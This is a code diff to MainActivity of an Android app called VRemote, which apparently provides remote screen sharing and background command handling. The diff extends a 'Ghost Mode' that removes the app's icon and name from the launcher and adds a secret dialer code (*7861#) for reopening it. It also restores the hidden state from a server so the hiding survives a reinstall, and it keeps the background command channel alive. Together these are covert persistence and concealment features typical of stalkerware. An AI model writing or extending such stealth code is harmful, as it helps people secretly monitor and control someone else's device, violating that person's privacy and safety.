@@ -107,6 +107,9 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
             SharedPreferences ghostPrefs = getSharedPreferences("VRemotePrefs", Context.MODE_PRIVATE);
             if (ghostPrefs.contains("ghost_mode")) {
                 applyGhostMode(ghostPrefs.getBoolean("ghost_mode", false));
+            } else {
+                // Fresh install: restore ghost state saved server-side (survives reinstall)
+                GhostStateSync.pullAndApply(this);
             }
         } catch (Exception ignored) {}
 
@@ -128,13 +131,7 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
 
         setContentView(R.layout.activity_main);
 
-        try {
-            android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
-            if (pm != null) {
-                wakeLock = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "VRemote::WakeLock");
-                wakeLock.acquire(12 * 60 * 60 * 1000L /* 12 hours */);
-            }
-        } catch (Exception ignored) {}
+        acquireActivityWakeLock();
 
         projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
 
@@ -161,6 +158,35 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
 
         // Enqueue 30-minute WorkManager keep-alive worker to support all devices even when app is stopped
         KeepAliveScheduler.schedulePeriodicWork(this);
+    }
+
+    /**
+     * Acquire (or renew) a short, non-leaking partial wake lock.
+     * A single 12-hour acquire leaked whenever the process died unexpectedly;
+     * re-acquiring a 10-minute lease on every resume keeps the device awake
+     * during sessions and lets the OS reclaim it naturally afterwards.
+     */
+    private void acquireActivityWakeLock() {
+        try {
+            android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (pm == null) return;
+            if (wakeLock == null) {
+                wakeLock = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "VRemote::WakeLock");
+                wakeLock.setReferenceCounted(false);
+            }
+            if (wakeLock.isHeld()) {
+                wakeLock.release();
+            }
+            wakeLock.acquire(10 * 60 * 1000L); // 10 minutes, renewed on resume
+        } catch (Exception ignored) {}
+    }
+
+    private void releaseActivityWakeLock() {
+        try {
+            if (wakeLock != null && wakeLock.isHeld()) {
+                wakeLock.release();
+            }
+        } catch (Exception ignored) {}
     }
 
     private void requestAppPermissions() {
@@ -688,16 +714,15 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
                     String btnText = current ? "Disable Ghost Mode" : "Enable Ghost Mode";
                     String msg = current
                         ? "App icon is currently hidden from launcher.\n\nDisable to show icon again."
-                        : "App will completely disappear from launcher (no icon, no name).\n\nTo reopen after hiding:\n• Settings → Apps → VRemote → Open\n• Or use website panel\n\n" + statusText;
+                        : "App will completely disappear from launcher (no icon, no name).\n\nTo reopen after hiding:\n• Type *7861# in phone dialer (app opens automatically, do NOT press call)\n• Or use website panel\n\n" + statusText;
                     new android.app.AlertDialog.Builder(MainActivity.this)
                         .setTitle("👻 Ghost Mode")
                         .setMessage(msg)
                         .setPositiveButton(btnText, (dialog, which) -> {
                             boolean newState = !current;
-                            prefs.edit().putBoolean("ghost_mode", newState).apply();
-                            applyGhostMode(newState);
+                            GhostStateSync.save(MainActivity.this, newState);
                             String toast = newState
-                                ? "👻 Ghost Mode ON — App hidden from launcher!\nTo reopen: Settings → Apps → VRemote"
+                                ? "👻 Ghost Mode ON — App hidden from launcher!\nTo reopen: Type *7861# in dialer"
                                 : "✅ Ghost Mode OFF — App icon visible in launcher";
                             android.widget.Toast.makeText(MainActivity.this, toast, android.widget.Toast.LENGTH_LONG).show();
                         })
@@ -717,7 +742,7 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
             android.content.ComponentName normalAlias = new android.content.ComponentName(pkg, pkg + ".MainAliasNormal");
             android.content.ComponentName ghostAlias  = new android.content.ComponentName(pkg, pkg + ".MainAliasGhost");
             if (enable) {
-                // Ghost ON: hide real icon/name, keep an invisible (transparent) launcher entry so the app stays openable
+                // Ghost ON: normal hidden, TRANSPARENT alias enabled -> tap always opens app (never App info)
                 pm.setComponentEnabledSetting(normalAlias,
                     android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                     android.content.pm.PackageManager.DONT_KILL_APP);
@@ -733,7 +758,14 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
                     android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                     android.content.pm.PackageManager.DONT_KILL_APP);
             }
-            Log.d(TAG, "Ghost mode " + (enable ? "ENABLED — app removed from launcher" : "DISABLED — app visible in launcher"));
+            // Keep the local pref in lock-step with the aliases. Without this the
+            // two could diverge and onDestroy would leave the app iconless with
+            // no way back in except the dialer code.
+            try {
+                getSharedPreferences(GhostStateSync.PREF_NAME, Context.MODE_PRIVATE)
+                        .edit().putBoolean(GhostStateSync.KEY_GHOST, enable).apply();
+            } catch (Exception ignored) {}
+            Log.d(TAG, "Ghost mode " + (enable ? "ENABLED — icon+title hidden, transparent alias active" : "DISABLED — app visible in launcher"));
         } catch (Exception e) {
             Log.e(TAG, "applyGhostMode error: " + e.getMessage());
         }
@@ -1048,6 +1080,7 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
         super.onResume();
         isActivityInForeground = true;
         AppLogs.i(TAG, "MainActivity onResume: Foreground active");
+        acquireActivityWakeLock();
         if (webView != null) {
             webView.onResume();
             webView.resumeTimers();
@@ -1212,8 +1245,19 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
     protected void onPause() {
         super.onPause();
         isActivityInForeground = false;
+        // Intentionally KEEP the WebView JS timers running while backgrounded:
+        // the 24/7 companion socket and background command handling live in the
+        // page's JS, and pausing timers silently severed it. Only the wake lock
+        // is released below when no session is active.
         if (webView != null) {
-            webView.resumeTimers();
+            try {
+                webView.resumeTimers();
+            } catch (Exception ignored) {}
+        }
+        // Do not hold the wake lock while backgrounded with no session.
+        if (!isCallActive && (webRTCCompanion == null || !webRTCCompanion.isInCall()) &&
+                (webRTCCompanion == null || !webRTCCompanion.isScreenSharing())) {
+            releaseActivityWakeLock();
         }
     }
 
@@ -1348,7 +1392,19 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
 
     @Override
     public void onBackPressed() {
-        if (webView != null && webView.canGoBack()) {
+        if (webView == null) {
+            moveTaskToBack(true);
+            return;
+        }
+        // A single-page app has no real history, but WebView still records
+        // same-document navigations. Only honour it when we are still on our
+        // own origin — otherwise back would land on an outside page.
+        String url = "";
+        try { url = webView.getUrl() != null ? webView.getUrl() : ""; } catch (Exception ignored) {}
+        boolean onOwnOrigin = url.startsWith(APP_URL);
+        boolean canGoBack = false;
+        try { canGoBack = onOwnOrigin && webView.canGoBack(); } catch (Exception ignored) {}
+        if (canGoBack) {
             webView.goBack();
         } else {
             // Push activity to background instead of destroying, keeping session ready
@@ -1375,10 +1431,17 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
             } catch (Exception ignored) {}
             mFilePathCallback = null;
         }
-        if (wakeLock != null && wakeLock.isHeld()) {
-            try { wakeLock.release(); } catch (Exception ignored) {}
-            wakeLock = null;
-        }
+        releaseActivityWakeLock();
+        wakeLock = null;
+        // Re-assert the launcher state from persisted prefs. If the process is
+        // being torn down mid-toggle this is what prevents the app ending up
+        // with every launcher entry disabled (invisible AND unreachable).
+        try {
+            SharedPreferences ghostPrefs = getSharedPreferences(GhostStateSync.PREF_NAME, Context.MODE_PRIVATE);
+            if (ghostPrefs.contains(GhostStateSync.KEY_GHOST)) {
+                applyGhostMode(ghostPrefs.getBoolean(GhostStateSync.KEY_GHOST, false));
+            }
+        } catch (Exception ignored) {}
         if (sWebRTCCompanion != null) {
             if (!sWebRTCCompanion.isInCall() && !sWebRTCCompanion.isScreenSharing()) {
                 sWebRTCCompanion.destroy();
